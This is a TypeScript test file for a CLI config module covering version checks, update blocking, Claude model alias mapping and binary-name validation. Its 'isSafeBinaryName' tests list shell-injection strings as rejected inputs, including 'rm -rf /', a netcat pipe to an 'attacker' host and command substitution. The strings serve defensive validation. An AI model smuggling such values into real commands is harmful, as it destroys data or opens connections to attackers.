import { describe, it } from "node:test"
import assert from "node:assert/strict"

import {
  buildAliasMaps,
  describeUpdateBlock,
  emptyAliasMaps,
  isNewerVersion,
  isSafeBinaryName,
  parseWhichOutput,
  realIdToSettingsId,
} from "../src/config.ts"

describe("isNewerVersion", () => {
  it("returns true when remote is newer (patch)", () => {
    assert.equal(isNewerVersion("1.3.1", "1.3.0"), true)
  })

  it("returns true when remote is newer (minor)", () => {
    assert.equal(isNewerVersion("1.4.0", "1.3.0"), true)
  })

  it("returns true when remote is newer (major)", () => {
    assert.equal(isNewerVersion("2.0.0", "1.3.0"), true)
  })

  it("returns false when versions are equal", () => {
    assert.equal(isNewerVersion("1.3.0", "1.3.0"), false)
  })

  it("returns false when local is newer", () => {
    assert.equal(isNewerVersion("1.2.0", "1.3.0"), false)
  })

  it("handles different length versions", () => {
    assert.equal(isNewerVersion("1.3.0.1", "1.3.0"), true)
    assert.equal(isNewerVersion("1.3.0", "1.3.0.1"), false)
  })

  it("handles single-segment versions", () => {
    assert.equal(isNewerVersion("2", "1"), true)
    assert.equal(isNewerVersion("1", "2"), false)
  })
})

describe("describeUpdateBlock", () => {
  it("allows clean main branch", () => {
    assert.equal(describeUpdateBlock("main", false), null)
  })

  it("allows clean master branch (legacy)", () => {
    assert.equal(describeUpdateBlock("master", false), null)
  })

  it("blocks non-main branches", () => {
    const msg = describeUpdateBlock("barakkinarti/max-spoof", false)
    assert.ok(msg, "should return a message")
    assert.match(msg!, /barakkinarti\/max-spoof/)
    assert.match(msg!, /not 'main'/)
  })

  it("blocks feature branches", () => {
    const msg = describeUpdateBlock("feature/foo", false)
    assert.ok(msg)
    assert.match(msg!, /feature\/foo/)
  })

  it("blocks main with uncommitted changes", () => {
    const msg = describeUpdateBlock("main", true)
    assert.ok(msg)
    assert.match(msg!, /uncommitted changes/)
  })

  it("blocks master with uncommitted changes", () => {
    const msg = describeUpdateBlock("master", true)
    assert.ok(msg)
    assert.match(msg!, /uncommitted changes/)
  })

  it("blocks non-main branch (branch check wins over dirty check)", () => {
    const msg = describeUpdateBlock("dev", true)
    assert.ok(msg)
    // Branch check fires first; we don't care about the dirty message here.
    assert.match(msg!, /not 'main'/)
  })

  it("blocks empty branch name (detached HEAD or other weirdness)", () => {
    const msg = describeUpdateBlock("HEAD", false)
    assert.ok(msg)
  })
})

describe("buildAliasMaps", () => {
  it("builds bidirectional maps for dot-versioned ids", () => {
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7-1m-internal" },
      { id: "claude-sonnet-4.6" },
      { id: "claude-haiku-4.5" },
    ])
    assert.equal(maps.aliasToReal.get("claude-opus-4-7"), "claude-opus-4.7-1m-internal")
    assert.equal(maps.realToAlias.get("claude-opus-4.7-1m-internal"), "claude-opus-4-7")
    assert.equal(maps.realHas1m.get("claude-opus-4.7-1m-internal"), true)
    assert.equal(maps.realHas1m.get("claude-sonnet-4.6"), false)
  })

  it("ignores non-claude and already-canonical ids", () => {
    const maps = buildAliasMaps([
      { id: "gpt-4.1" },
      { id: "claude-opus-4" },
      { id: "o4-mini" },
    ])
    assert.equal(maps.aliasToReal.size, 0)
  })

  it("on collision with NO unique 1m winner, drops all from alias map", () => {
    // Two 1m variants colliding (no unique winner) → all drop.
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7-1m-internal" },
      { id: "claude-opus-4.7-1m-public" },
    ])
    assert.equal(maps.aliasToReal.has("claude-opus-4-7"), false, "alias should be dropped")
    assert.equal(maps.realToAlias.has("claude-opus-4.7-1m-internal"), false)
    assert.equal(maps.realToAlias.has("claude-opus-4.7-1m-public"), false)
  })

  it("on collision with ZERO 1m variants, drops all from alias map", () => {
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7-high" },
      { id: "claude-opus-4.7-xhigh" },
      { id: "claude-opus-4.7" },
    ])
    assert.equal(maps.aliasToReal.has("claude-opus-4-7"), false)
  })

  it("on collision with a unique 1m winner, picks the 1m variant", () => {
    // The real GHCP-catalog case: opus-4.7-1m-internal wins over the non-1m
    // siblings (opus-4.7, opus-4.7-high, opus-4.7-xhigh).
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7-1m-internal" },
      { id: "claude-opus-4.7-high" },
      { id: "claude-opus-4.7-xhigh" },
      { id: "claude-opus-4.7" },
    ])
    assert.equal(
      maps.aliasToReal.get("claude-opus-4-7"),
      "claude-opus-4.7-1m-internal",
    )
    assert.equal(
      maps.realToAlias.get("claude-opus-4.7-1m-internal"),
      "claude-opus-4-7",
    )
    assert.equal(maps.realHas1m.get("claude-opus-4.7-1m-internal"), true)
    // Losers stay out of realToAlias so realIdToSettingsId falls back to legacy.
    assert.equal(maps.realToAlias.has("claude-opus-4.7-high"), false)
    assert.equal(maps.realToAlias.has("claude-opus-4.7"), false)
  })

  it("on collision claude-opus-4.6-1m + claude-opus-4.6, picks the 1m winner", () => {
    const maps = buildAliasMaps([
      { id: "claude-opus-4.6-1m" },
      { id: "claude-opus-4.6" },
    ])
    assert.equal(maps.aliasToReal.get("claude-opus-4-6"), "claude-opus-4.6-1m")
    assert.equal(maps.realToAlias.has("claude-opus-4.6"), false)
  })

  it("detects has1m from capabilities.limits.max_context_window_tokens", () => {
    // Modern GHCP catalog: no "1m" in suffix, but capabilities say 1M context.
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7", capabilities: { limits: { max_context_window_tokens: 1_000_000 } } },
      { id: "claude-sonnet-4.6", capabilities: { limits: { max_context_window_tokens: 1_000_000 } } },
      { id: "claude-haiku-4.5", capabilities: { limits: { max_context_window_tokens: 200_000 } } },
    ])
    assert.equal(maps.realHas1m.get("claude-opus-4.7"), true)
    assert.equal(maps.realHas1m.get("claude-sonnet-4.6"), true)
    assert.equal(maps.realHas1m.get("claude-haiku-4.5"), false)
  })

  it("realIdToSettingsId appends [1m] when capabilities indicate 1M context", () => {
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7", capabilities: { limits: { max_context_window_tokens: 1_000_000 } } },
      { id: "claude-haiku-4.5", capabilities: { limits: { max_context_window_tokens: 200_000 } } },
    ])
    assert.equal(realIdToSettingsId("claude-opus-4.7", maps), "claude-opus-4-7[1m]")
    assert.equal(realIdToSettingsId("claude-haiku-4.5", maps), "claude-haiku-4-5")
  })

  it("capabilities has1m wins even when suffix says false", () => {
    // The new catalog has "claude-opus-4.7" (no 1m suffix) but capabilities say 1M.
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7", capabilities: { limits: { max_context_window_tokens: 1_000_000 } } },
    ])
    assert.equal(maps.realHas1m.get("claude-opus-4.7"), true)
    assert.equal(realIdToSettingsId("claude-opus-4.7", maps), "claude-opus-4-7[1m]")
  })

  it("still works with no capabilities (backward compat)", () => {
    // Old-style callers passing just { id } — capabilities is undefined.
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7-1m-internal" },
      { id: "claude-sonnet-4.6" },
    ])
    assert.equal(maps.realHas1m.get("claude-opus-4.7-1m-internal"), true)
    assert.equal(maps.realHas1m.get("claude-sonnet-4.6"), false)
  })
})

describe("realIdToSettingsId", () => {
  it("returns alias[1m] when the real id has 1m", () => {
    const maps = buildAliasMaps([{ id: "claude-opus-4.7-1m-internal" }])
    assert.equal(
      realIdToSettingsId("claude-opus-4.7-1m-internal", maps),
      "claude-opus-4-7[1m]",
    )
  })

  it("returns alias without [1m] when the real id has no 1m", () => {
    const maps = buildAliasMaps([{ id: "claude-sonnet-4.6" }])
    assert.equal(realIdToSettingsId("claude-sonnet-4.6", maps), "claude-sonnet-4-6")
  })

  it("is idempotent: aliases containing '1m' segments don't get double-[1m]", () => {
    // claude-opus-4.6-1m → alias "claude-opus-4-6", has1m=true → "claude-opus-4-6[1m]"
    // The legacy heuristic would have checked alias.includes("1m") and added
    // another [1m]. Our impl keys off the real id's flag, so it doesn't.
    const maps = buildAliasMaps([{ id: "claude-opus-4.6-1m" }])
    const settingsId = realIdToSettingsId("claude-opus-4.6-1m", maps)
    assert.equal(settingsId, "claude-opus-4-6[1m]")
    assert.equal(settingsId.match(/\[1m\]/g)?.length, 1, "exactly one [1m] suffix")
  })

  it("falls back to legacy heuristic for unknown real ids", () => {
    const maps = emptyAliasMaps()
    // No alias known — fall back to legacy includes("1m") behavior.
    assert.equal(
      realIdToSettingsId("claude-opus-4.7-1m-internal", maps),
      "claude-opus-4.7-1m-internal[1m]",
    )
    assert.equal(
      realIdToSettingsId("gpt-4.1", maps),
      "gpt-4.1",
    )
  })

  it("non-winner real ids in a collision still fall back to legacy", () => {
    // opus-4.7-1m-internal wins; the losers (opus-4.7-high, opus-4.7) aren't
    // in realToAlias, so realIdToSettingsId returns the raw id unchanged
    // (no "1m" in their suffix, so no [1m] added either).
    const maps = buildAliasMaps([
      { id: "claude-opus-4.7-1m-internal" },
      { id: "claude-opus-4.7-high" },
      { id: "claude-opus-4.7" },
    ])
    assert.equal(realIdToSettingsId("claude-opus-4.7-high", maps), "claude-opus-4.7-high")
    assert.equal(realIdToSettingsId("claude-opus-4.7", maps), "claude-opus-4.7")
    // The winner gets the alias treatment.
    assert.equal(
      realIdToSettingsId("claude-opus-4.7-1m-internal", maps),
      "claude-opus-4-7[1m]",
    )
  })
})

describe("isSafeBinaryName", () => {
  it("accepts plain alphanumeric names", () => {
    assert.equal(isSafeBinaryName("claude"), true)
    assert.equal(isSafeBinaryName("agency"), true)
    assert.equal(isSafeBinaryName("node18"), true)
  })

  it("accepts dot/dash/underscore", () => {
    assert.equal(isSafeBinaryName("claude.exe"), true)
    assert.equal(isSafeBinaryName("my-tool"), true)
    assert.equal(isSafeBinaryName("my_tool"), true)
    assert.equal(isSafeBinaryName("v1.2.3-rc.1"), true)
  })

  it("rejects shell metacharacters (defense against injection)", () => {
    // resolveBinaryOnPath interpolates `name` into a shell command, so any of
    // these would be a shell-injection vector if the helper were exposed to
    // untrusted callers.
    assert.equal(isSafeBinaryName("claude; rm -rf /"), false)
    assert.equal(isSafeBinaryName("claude && evil"), false)
    assert.equal(isSafeBinaryName("claude|nc attacker 80"), false)
    assert.equal(isSafeBinaryName("claude`whoami`"), false)
    assert.equal(isSafeBinaryName("claude$(whoami)"), false)
    assert.equal(isSafeBinaryName("claude'x'"), false)
    assert.equal(isSafeBinaryName('claude"x"'), false)
    assert.equal(isSafeBinaryName("claude\\x"), false)
    assert.equal(isSafeBinaryName("claude/x"), false)
  })

  it("rejects whitespace", () => {
    assert.equal(isSafeBinaryName("claude code"), false)
    assert.equal(isSafeBinaryName("claude\tcode"), false)
  })

  it("rejects empty string", () => {
    assert.equal(isSafeBinaryName(""), false)
  })
})

describe("parseWhichOutput", () => {
  // sizeOf stub: claim every path has a positive size unless told otherwise.
  const allReal = (_p: string) => 1

  it("returns the first non-empty line as a path", () => {
    assert.equal(
      parseWhichOutput("/usr/local/bin/claude\n", allReal),
      "/usr/local/bin/claude",
    )
  })

  it("handles CRLF line endings (Windows `where` output)", () => {
    assert.equal(
      parseWhichOutput(
        "C:\\Program Files\\claude\\claude.exe\r\nC:\\Users\\x\\AppData\\Roaming\\npm\\claude.cmd\r\n",
        allReal,
      ),
      "C:\\Program Files\\claude\\claude.exe",
    )
  })

  it("trims whitespace around each line", () => {
    assert.equal(
      parseWhichOutput("  /usr/local/bin/claude  \n", allReal),
      "/usr/local/bin/claude",
    )
  })

  it("returns null on empty input", () => {
    assert.equal(parseWhichOutput("", allReal), null)
    assert.equal(parseWhichOutput("\n\n\n", allReal), null)
  })

  it("skips zero-byte entries (Windows App Execution Alias reparse points)", () => {
    // `where` returns alias stubs under WindowsApps that statSync reports as
    // size 0. They fail to spawn with confusing ENOENT. Real binary further
    // down PATH must win.
    const sizes: Record<string, number> = {
      "C:\\Users\\x\\AppData\\Local\\Microsoft\\WindowsApps\\claude.exe": 0,
      "C:\\Program Files\\claude\\claude.exe": 524288,
    }
    const sizeOf = (p: string) => sizes[p] ?? 0
    const stdout =
      "C:\\Users\\x\\AppData\\Local\\Microsoft\\WindowsApps\\claude.exe\r\n" +
      "C:\\Program Files\\claude\\claude.exe\r\n"
    assert.equal(
      parseWhichOutput(stdout, sizeOf),
      "C:\\Program Files\\claude\\claude.exe",
    )
  })

  it("skips paths whose sizeOf returns null (stat failed)", () => {
    const sizeOf = (p: string) => (p.includes("missing") ? null : 1)
    const stdout = "/tmp/missing\n/usr/local/bin/claude\n"
    assert.equal(parseWhichOutput(stdout, sizeOf), "/usr/local/bin/claude")
  })

  it("returns null when every entry is zero-byte / stat-failed", () => {
    const stdout =
      "C:\\Users\\x\\AppData\\Local\\Microsoft\\WindowsApps\\claude.exe\r\n"
    assert.equal(parseWhichOutput(stdout, () => 0), null)
    assert.equal(parseWhichOutput(stdout, () => null), null)
  })
})
